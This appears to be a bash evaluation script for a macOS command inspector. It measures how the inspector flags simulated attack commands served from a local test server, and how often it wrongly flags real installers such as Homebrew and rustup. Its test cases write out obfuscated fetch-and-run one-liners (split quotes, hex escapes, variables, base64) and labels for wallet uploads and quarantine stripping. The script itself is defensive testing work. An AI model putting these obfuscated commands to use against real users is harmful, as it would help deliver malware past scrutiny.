#!/bin/bash
# Static evaluation of `macx guard inspect`: how many simulated attacks it flags (detection) and how many
# real, widely used installers it wrongly flags (false positives). Nothing is run: inspect only reads.
#
# Usage: scripts/eval/static.sh [macx-binary] [results.md]
# Needs network access for the benign set (it fetches real install scripts).
set -u
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
MACX="${1:-$ROOT/.build/release/macx}"
OUT="${2:-$ROOT/research/evaluation/static-results.md}"
[ -x "$MACX" ] || { echo "Build macx first: swift build -c release"; exit 1; }

WORK="$(mktemp -d)"
trap 'kill $SERVER 2>/dev/null; rm -rf "$WORK"' EXIT
cp -R "$ROOT/Tests/Evaluation/served" "$WORK/www"
cd "$WORK/www" || exit 1
/usr/bin/python3 -I -m http.server 0 --bind 127.0.0.1 >/dev/null 2>&1 &
SERVER=$!
PORT=""
for _ in $(seq 1 50); do
  PORT=$(lsof -nP -a -p "$SERVER" -iTCP -sTCP:LISTEN 2>/dev/null | awk 'NR>1{split($9,a,":"); print a[2]; exit}')
  [ -n "$PORT" ] && break
  sleep 0.1
done
[ -n "$PORT" ] || { echo "Local test server didn't start"; exit 1; }
for f in *.sh; do sed -i '' "s/PORT/$PORT/g" "$f"; done
B="http://127.0.0.1:$PORT"
B64=$(printf 'curl -s %s/amos-classic.sh | zsh' "$B" | base64)

now() { /usr/bin/python3 -I -c 'import time; print(time.time())'; }

# expected | label | command
CASES=$(cat <<CASES_END
malicious|AMOS-style script piped to zsh|curl -fsSL $B/amos-classic.sh | zsh
malicious|Same, disguised with split quotes|c''url -s $B/amos-classic.sh | z"s"h
malicious|Same, disguised with \$'\\\\x..' escapes|\$'\\x63\\x75\\x72\\x6c' -s $B/amos-classic.sh | sh
malicious|Same, disguised with variables|a=cu; b=rl; \$a\$b -s $B/amos-classic.sh | sh
malicious|Same, hidden in base64 (the 21 Aug paste form)|echo '$B64' | base64 -D | zsh
malicious|Same, process substitution|bash <(curl -fsSL $B/amos-classic.sh)
malicious|Same, download then run|curl -fsSL $B/amos-classic.sh -o /tmp/a.sh && zsh /tmp/a.sh
malicious|Two-stage: fake Apple launch daemon in stage 2|curl -s $B/two-stage.sh | sh
malicious|Script that decodes a hidden password prompt|curl -s $B/base64-chain.sh | zsh
malicious|Wallet files copied and uploaded|curl -s $B/wallet-upload.sh | sh
malicious|Strips quarantine and opens an app|curl -s $B/quarantine-and-launch.sh | sh
malicious|Downloads a program and runs it|curl -s $B/drops-binary.sh | sh
malicious|Runs code from a variable|curl -s $B/eval-variable.sh | sh
malicious|Downloads from a computed link|curl -s $B/computed-url.sh | sh
malicious|Writes a script and runs it|curl -s $B/generated-script.sh | sh
malicious|Link serves a program, not a script|curl -fsSL -o /tmp/b $B/binary.bin && /tmp/b
malicious|Link serves nothing (cloaking)|curl -s $B/empty.sh | sh
benign|Homebrew|/bin/bash -c "\$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
benign|rustup|curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
benign|nvm|curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash
benign|Oh My Zsh|sh -c "\$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"
benign|bun|curl -fsSL https://bun.sh/install | bash
benign|deno|curl -fsSL https://deno.land/install.sh | sh
benign|uv|curl -LsSf https://astral.sh/uv/install.sh | sh
benign|pnpm|curl -fsSL https://get.pnpm.io/install.sh | sh -
benign|starship|curl -sS https://starship.rs/install.sh | sh
benign|fnm|curl -fsSL https://fnm.vercel.app/install | bash
benign|Spicetify|curl -fsSL https://raw.githubusercontent.com/spicetify/cli/main/install.sh | sh
CASES_END
)

ROWS=""
TP=0; TC=0; FN=0; FU=0; FP=0; FC=0; TN=0; TU=0; ERR=0; TOTAL_T=0; N=0
while IFS='|' read -r expected label cmd; do
  [ -z "$expected" ] && continue
  t0=$(now)
  out=$("$MACX" guard inspect --no-run -- "$cmd" 2>&1)
  t1=$(now)
  ms=$(/usr/bin/python3 -I -c "print(round(($t1-$t0)*1000))")
  TOTAL_T=$((TOTAL_T + ms)); N=$((N + 1))
  verdict=$(printf '%s\n' "$out" | sed -n 's/^Verdict: //p' | tail -1)
  [ -z "$verdict" ] && verdict="(no verdict: $(printf '%s' "$out" | head -1 | cut -c1-60))"
  rules=$(printf '%s\n' "$out" | grep -oE '\[[a-z0-9-]+\]' | tr -d '[]' | sort -u | grep -vE '^(ip-address-host|plain-http|new-host)$' | tr '\n' ' ')
  case "$expected:$verdict" in
    malicious:"DON'T RUN THIS") TP=$((TP+1)); res="detected" ;;
    malicious:"Be careful") TC=$((TC+1)); res="flagged (caution)" ;;
    malicious:*) FN=$((FN+1)); res="**missed**" ;;
    benign:"DON'T RUN THIS") FP=$((FP+1)); res="**false positive**" ;;
    benign:"Be careful") FC=$((FC+1)); res="caution" ;;
    benign:"Nothing dangerous found") TN=$((TN+1)); res="clean" ;;
    benign:"Nothing dangerous in what could be read"*) TU=$((TU+1)); res="clean, parts unchecked" ;;
    malicious:"Nothing dangerous in what could be read"*) FU=$((FU+1)); res="**partly unknown**" ;;
    *) ERR=$((ERR+1)); res="error" ;;
  esac
  ROWS="$ROWS| $expected | $label | $verdict | $res | ${rules:-none} | $ms |
"
  printf '%-9s %-48s %-24s %s\n' "$expected" "$label" "$verdict" "$res"
done <<< "$CASES"

MAL=$((TP + TC + FU + FN)); BEN=$((FP + FC + TN + TU + ERR))
mkdir -p "$(dirname "$OUT")"
{
  echo "# Static evaluation: macx guard inspect"
  echo
  echo "- Date: $(date -u +%Y-%m-%d) · macx $("$MACX" --version) · commit $(git -C "$ROOT" rev-parse --short HEAD 2>/dev/null) · macOS $(sw_vers -productVersion) ($(uname -m))"
  echo "- Simulated attacks are harmless imitations served from a local test server (\`Tests/Evaluation/served\`). Benign cases are real install commands fetched live."
  echo "- Nothing was run: \`macx guard inspect --no-run\` only downloads and reads."
  echo
  echo "## Summary"
  echo
  echo "| | Count |"
  echo "|---|---|"
  echo "| Simulated attacks | $MAL |"
  echo "| → verdict *DON'T RUN THIS* | $TP |"
  echo "| → verdict *Be careful* | $TC |"
  echo "| → *partly unknown* (nothing seen, parts unchecked) | $FU |"
  echo "| → missed (*Nothing dangerous found*) | $FN |"
  echo "| Real installers | $BEN |"
  echo "| → clean | $TN |"
  echo "| → clean, parts couldn't be checked | $TU |"
  echo "| → *Be careful* | $FC |"
  echo "| → false positive (*DON'T RUN THIS*) | $FP |"
  echo "| → errors (couldn't fetch, etc.) | $ERR |"
  echo "| Average time per check | $((TOTAL_T / (N > 0 ? N : 1))) ms |"
  echo
  echo "Caveat: every simulated attack is served over plain http from 127.0.0.1, which by itself adds two medium facts"
  echo "(\`plain-http\`, \`ip-address-host\`) and so at least *Be careful*. The *Rules* column leaves those facts out, so"
  echo "it shows what the script's own content triggered."
  echo
  echo "## Cases"
  echo
  echo "| Expected | Case | Verdict | Result | Rules (without source facts) | ms |"
  echo "|---|---|---|---|---|---|"
  printf '%s' "$ROWS"
} > "$OUT"
echo
echo "Detection: $TP dangerous + $TC caution + $FU partly-unknown of $MAL attacks, $FN missed. False positives: $FP of $BEN installers ($FC caution, $TU parts unchecked). Written to $OUT"
